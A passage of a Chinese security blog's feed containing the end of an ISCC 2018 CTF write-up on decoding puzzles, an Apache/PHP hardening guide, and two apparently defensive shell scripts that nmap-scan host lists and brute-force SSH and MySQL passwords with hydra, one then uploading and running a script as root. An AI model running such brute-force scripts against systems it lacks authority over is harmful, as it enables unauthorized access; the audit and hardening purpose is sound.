alt="mark"></p><pre><code>GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E</code></pre><p><strong>发现不能继续base64解码，于是尝试<a href="http://www.qqxiuzi.cn/bianma/base.php" title="base32解码" target="_blank" rel="external">base32解码</a>，又得到一串16进制编码的字符</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/793HGfBemk.png?imageslim" alt="mark"></p><pre><code>5231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D</code></pre><p><strong>再次16进制解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/J2fg7abC8c.png?imageslim" alt="mark"></p><pre><code>R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ==</code></pre><p><strong>再次进行base64解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/7DdBIaa74k.png?imageslim" alt="mark"></p><pre><code>GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A====</code></pre><p><strong>发现又不能进行base64解码了，于是用base32解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/di5KkBGC4l.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h7eDbL5I2d.png?imageslim" alt="mark"></p><pre><code>463161395F69735F493563635F5A4F6C385F4733545030314E54</code></pre><p><strong>再进行16进制解码，就能得到flag了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/FIfeCBbcjl.png?imageslim" alt="mark"></p><pre><code>flag：F1a9_is_I5cc_ZOl8_G3TP01NT</code></pre><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p><strong>HINT：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</strong></p><p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bf79A2KllA.png?imageslim" alt="mark"><br><strong>用winhex查看一下该图片，发现文件尾有一些编码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/gI0A6GlK8a.png?imageslim" alt="mark"></p><pre><code>&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#55;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#98;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#101;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#100; </code></pre><p><strong>html解码一下，发现是一串unicode</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/jKbC755A7f.png?imageslim" alt="mark"></p><pre><code>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d </code></pre><p><strong>unicode解码一下，这里直接用python输出就好，得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/047IB022ac.png?imageslim" alt="mark"></p><pre><code>flag{iscc is fun}</code></pre><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p><strong>HINT：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</strong></p><p><strong>根据提示先将这串字符<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" title="rot13解密" target="_blank" rel="external">rot13解密</a>一下，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j663FihbdA.png?imageslim" alt="mark"></p><pre><code>roqtp697t95j3</code></pre><p><strong>再查看键盘，找到这些字符串每个字符在键盘上下面位置的字符，比如<code>r</code>下面的字符为<code>f</code>，依次替换就能得到flag</strong></p><pre><code>flag:yougotme</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ISCC2018-write-up&quot;&gt;&lt;a href=&quot;#ISCC2018-write-up&quot; class=&quot;headerlink&quot; title=&quot;ISCC2018 write up&quot;&gt;&lt;/a&gt;ISCC2018 write up&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Apache安全加固</title>
    <link href="http://yoursite.com/2018/05/19/apache_security_config/"/>
    <id>http://yoursite.com/2018/05/19/apache_security_config/</id>
    <published>2018-05-19T15:38:59.866Z</published>
    <updated>2018-06-03T13:54:40.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h1><p><strong>这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos</strong><br><a id="more"></a></p><h2 id="服务器banner信息隐藏"><a href="#服务器banner信息隐藏" class="headerlink" title="服务器banner信息隐藏"></a>服务器banner信息隐藏</h2><h3 id="404页面以及http响应头信息泄露"><a href="#404页面以及http响应头信息泄露" class="headerlink" title="404页面以及http响应头信息泄露"></a>404页面以及http响应头信息泄露</h3><p><strong>如果对服务器一个不存在的资源进行访问，网站返回的404页面将会泄露apache版本，服务器操作系统类型等信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180519/90D016lEic.png?imageslim" alt="mark"><br><strong>可以看到404错误页面显示了apache的版本、服务器的操作系统类型、ip和端口</strong></p><p><strong>还有就是在http的响应头中，也会泄露有关服务器的一些信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E6ibcfJ04E.png?imageslim" alt="mark"><br><strong>http响应头的Server中泄露了apache的版本和服务器操作系统类型</strong></p><p><strong>加固方案：需要修改apache配置文件的两个地方，配置文件位置：<code>/etc/httpd/conf/httpd.conf</code>,将对应的参数修改成下面的值</strong></p><pre><code>ServerTokens ProdServerSignature Off</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5DDcBfL29g.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/k9j741e1cA.png?imageslim" alt="mark"><br><strong>修改完后重启服务,就可以修复了，可以看到这些信息不再出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/L4F39GedbG.png?imageslim" alt="mark"></p><h3 id="http响应头泄露php版本信息"><a href="#http响应头泄露php版本信息" class="headerlink" title="http响应头泄露php版本信息"></a>http响应头泄露php版本信息</h3><p><strong>http响应头中的X-Powered-By泄露了php版本信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i1JI409h8c.png?imageslim" alt="mark"><br><strong>加固方案：修改php配置文件，配置文件位置：<code>/etc/php.ini</code>，修改参数</strong></p><pre><code>expose_php=Off</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/eHK8lHCE4k.png?imageslim" alt="mark"><br><strong>修改完成后，重启apache服务，php版本信息不再显示</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/D8gfh8iBCi.png?imageslim" alt="mark"></p><h2 id="修改apache默认主页"><a href="#修改apache默认主页" class="headerlink" title="修改apache默认主页"></a>修改apache默认主页</h2><h3 id="apache默认主页信息泄露"><a href="#apache默认主页信息泄露" class="headerlink" title="apache默认主页信息泄露"></a>apache默认主页信息泄露</h3><p><strong>当apache安装完成后，apache的默认主页会泄露服务器的一些信息</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BcDmc95fcG.png?imageslim" alt="mark"><br><strong>可以看到apache默认页面泄露了网站的根目录和某配置文件</strong></p><p><strong>加固方案：修改apache配置文件中的DirectoryIndex，并在网站根目录自定义index.html或者index.php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/4LkC4jeEBG.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/cEK1GFb0fJ.png?imageslim" alt="mark"><br><strong>修改完成后不再显示默认页</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/Fb38bd4llF.png?imageslim" alt="mark"></p><h2 id="自定义404页面"><a href="#自定义404页面" class="headerlink" title="自定义404页面"></a>自定义404页面</h2><p><strong>为了安全考虑和与网站用户的友好交互，自定义404页面也是件必要的事情</strong></p><p><strong>加固方法：在网上寻找404页面模板上传至服务器网站根目录，修改apache配置文件，找到<code>ErrorDocument 404</code>,将自定义的404页面路径添加上去</strong></p><pre><code>ErrorDocument 404 /404page/index.html</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/DfhJ1f3laC.png?imageslim" alt="mark"><br><strong>同时修改404的html文件，修改css，js文件的加载路径，不然css和js会因为请求不到资源而加载失败</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/AhLkBAekKD.png?imageslim" alt="mark"></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/EIgCFDal5A.png?imageslim" alt="mark"><br><strong>重启apache服务</strong></p><p><strong>修改前的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9ECKkDDEbh.png?imageslim" alt="mark"><br><strong>修改后的404页面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/m70eLc5Fc3.png?imageslim" alt="mark"></p><h2 id="防止列目录泄露敏感信息"><a href="#防止列目录泄露敏感信息" class="headerlink" title="防止列目录泄露敏感信息"></a>防止列目录泄露敏感信息</h2><p><strong>网站允许列目录是个很严重的安全问题，有时由于列目录可能会导致一些配置文件或者一些重要敏感信息泄露</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/l3hi9EH7d6.png?imageslim" alt="mark"><br><strong>加固方案：其中一种加固方案就是在每个目录下都设置一个默认页（index.html或者index.php），这样可以防止列目录，但是会比较麻烦.另外一种方式就是修改apache的配置文件，将网站根目录<code>/var/www/html</code>下的<code>Options Indexes FollowSymLinks</code>改为<code>Options FollowSymLinks</code>,将indexes参数去掉</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LeG2c9gJGG.png?imageslim" alt="mark"><br><strong>修改完成后重启服务，再次访问目录就会出现403禁止访问的页面，但是目录下的页面还是可以照常访问，只是禁止了列目录的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kJfeFbbH70.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/kk09aFAaeg.png?imageslim" alt="mark"></p><h2 id="禁用php危险函数"><a href="#禁用php危险函数" class="headerlink" title="禁用php危险函数"></a>禁用php危险函数</h2><p><strong>php有些函数如果开启的话，当黑客拿下一个webshell就会利用函数取执行一些危险命令，所以可以把一些危险函数禁用掉，以phpinfo为例，修改php配置文件<code>/etc/php.ini</code>,查找<code>disable_funcions</code>，配置</strong></p><pre><code>disable_funcions=phpinfo</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0Cd68AI7hC.png?imageslim" alt="mark"><br><strong>修改前</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/c06CGjEle1.png?imageslim" alt="mark"><br><strong>修改后</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/B227gA44Em.png?imageslim" alt="mark"></p><h2 id="指定目录禁止php解析"><a href="#指定目录禁止php解析" class="headerlink" title="指定目录禁止php解析"></a>指定目录禁止php解析</h2><p><strong>通常，向一些上传图片的目录，如果代码层对文件上传没有做好限制，导致黑客上传php代码getshell，所以对指定目录禁止php解析是很有必要的</strong></p><p><strong>比如网站上传目录被上传了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/CJ1KJe707J.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/43F7LhCH5J.png?imageslim" alt="mark"><br><strong>可以连接webshell，这是很严重的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/0DmGmab529.png?imageslim" alt="mark"></p><p><strong>加固方案，修改apache配置文件，设置指定目录没有执行php的权限，在配置文件中添加</strong></p><pre><code>&lt;Directory &quot;/var/www/html/uploads&quot;&gt;    php_flag engine off&lt;/Directory&gt;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/3E7LaFlicG.png?imageslim" alt="mark"><br><strong>重启服务，可以看到由于uploads目录下禁止解析php脚本了，所以此时webshell就不能连接了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G2IGhHemdG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Apache安全加固&quot;&gt;&lt;a href=&quot;#Apache安全加固&quot; class=&quot;headerlink&quot; title=&quot;Apache安全加固&quot;&gt;&lt;/a&gt;Apache安全加固&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全加固" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
      <category term="Apache" scheme="http://yoursite.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>用shell实现对指定ip进行自动基线安全检查</title>
    <link href="http://yoursite.com/2018/05/17/autocheck/"/>
    <id>http://yoursite.com/2018/05/17/autocheck/</id>
    <published>2018-05-17T15:14:50.395Z</published>
    <updated>2018-06-04T14:56:58.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell脚本实现对指定ip进行自动基线安全检查"><a href="#用shell脚本实现对指定ip进行自动基线安全检查" class="headerlink" title="用shell脚本实现对指定ip进行自动基线安全检查"></a>用shell脚本实现对指定ip进行自动基线安全检查</h1><p><strong>最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器</strong><br><a id="more"></a></p><p><strong>scp.exp:发送基线脚本到指定ip的服务器</strong></p><pre><code>#!/usr/bin/expect -fset timeout 10set host [lindex $argv 0]set username [lindex $argv 1]set password [lindex $argv 2]set src_file [lindex $argv 3]set dest_file [lindex $argv 4]spawn scp -r $src_file $username@$host:/tmp/$dest_fileexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }}expect &quot;100%&quot;expect eof:</code></pre><p><strong>excute.exp：ssh登陆指定ip执行之前上传的基线脚本，并且将运行结果的文件发送回来</strong></p><pre><code>#!/usr/bin/expect -f set ip [lindex $argv 0 ]set password [lindex $argv 1 ]set timeout 10spawn ssh root@$ip expect { &quot;*yes/no&quot; { send &quot;yes\r&quot;; exp_continue}&quot;*password:&quot; { send &quot;$password\r&quot; }}expect {&quot;#*&quot;  { send &quot;pwd\r cd /tmp/\r ./66c221be-6ab2-ef53-1589-fe16877914f4.sh $ip\r&quot; }}spawn scp root@$ip:/tmp/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xml /root/autocheck/report/192.168.3.3_66c221be-6ab2-ef53-1589-fe16877914f4_chk.xmlexpect {     &quot;(yes/no)?&quot; {             send &quot;yes\n&quot;             expect &quot;*assword:&quot; { send &quot;$password\n&quot; }     }     &quot;*assword:&quot; {             send &quot;$password\n&quot;     }} expect eofexit</code></pre><p><strong>ip.list：存放需要检查的ip列表</strong></p><p><strong>autocheck.sh：读取ip列表，检查存活的主机，过滤出开放22端口的主机ip，调用之前写的两个脚本去自动传送基线检查脚本执行并且将结果返回回来</strong></p><pre><code>#!/bin/bashfor ip in `cat ip.list`donewip=`nmap -Pn -sS -p 22 $ip|grep &quot;open&quot; -B4|awk &apos;/Nmap scan/{print $5}&apos;`hydra -l root -p 123456 $newip ssh|grep &quot;password:&quot;if [ $? == 0 ]then./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.sh&quot;./scp.exp $newip &quot;root&quot; &quot;123456&quot; &quot;/root/autocheck/linux_check/66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot; &quot;66c221be-6ab2-ef53-1589-fe16877914f4.pl&quot;./excute.exp $newip &quot;123456&quot;elsecontinuefidone</code></pre><p><strong>执行./autocheck.sh后的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/9DhgKGAfg5.png?imageslim" alt="mark"><br><strong>可以看到report目录下就是返回来的文件，里面存放着linux基线扫描的结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180517/HaAkCfiD57.png?imageslim" alt="mark"></p><p><strong>还可以改进的地方，这个脚本用户名密码写死了，可以再加一个用户名密码文件，读取用户名密码登录，然后检查，这样会更有实际意义，自己会不断完善功能，希望在以后的实习中可以直接用到。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;a href=&quot;#用shell脚本实现对指定ip进行自动基线安全检查&quot; class=&quot;headerlink&quot; title=&quot;用shell脚本实现对指定ip进行自动基线安全检查&quot;&gt;&lt;/a&gt;用shell脚本实现对指定ip进行自动基线安全检查&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
  <entry>
    <title>用shell实现自动化扫描主机端口爆破服务弱口令</title>
    <link href="http://yoursite.com/2018/05/14/autobrute/"/>
    <id>http://yoursite.com/2018/05/14/autobrute/</id>
    <published>2018-05-14T08:36:34.456Z</published>
    <updated>2018-06-04T14:55:53.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用shell实现自动化扫描主机端口爆破服务弱口令"><a href="#用shell实现自动化扫描主机端口爆破服务弱口令" class="headerlink" title="用shell实现自动化扫描主机端口爆破服务弱口令"></a>用shell实现自动化扫描主机端口爆破服务弱口令</h1><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong><br><a id="more"></a></p><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p><p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p><h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p><p><strong>ip.txt</strong></p><pre><code>ip列表，里面放着要扫描的ip</code></pre><p><strong>service.conf</strong></p><pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p><pre><code>22:ssh3306:mysql</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p><p><strong>user.txt</strong></p><pre><code>存放着常见的用户名，用于hydra爆破</code></pre><p><strong>passwd.txt</strong></p><pre><code>存放着常见的弱口令，用于hydra爆破</code></pre><p><strong>brute.sh</strong></p><pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作#!/bin/bashfilename=$1for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`doname=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`echo &quot;$name weak password result:&quot;nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txtnmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txtif [ ! -s tmpip.txt ]thenecho &quot;no ip open port $port&quot;elseresult=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`echo $resultfidone</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p><p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p><p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;a href=&quot;#用shell实现自动化扫描主机端口爆破服务弱口令&quot; class=&quot;headerlink&quot; title=&quot;用shell实现自动化扫描主机端口爆破服务弱口令&quot;&gt;&lt;/a&gt;用shell实现自动化扫描主机端口爆破服务弱口令&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux Shell" scheme="http://yoursite.com/categories/Linux-Shell/"/>
    
    
      <category term="Linux Shell" scheme="http://yoursite.com/tags/Linux-Shell/"/>
    
  </entry>
  
</feed>
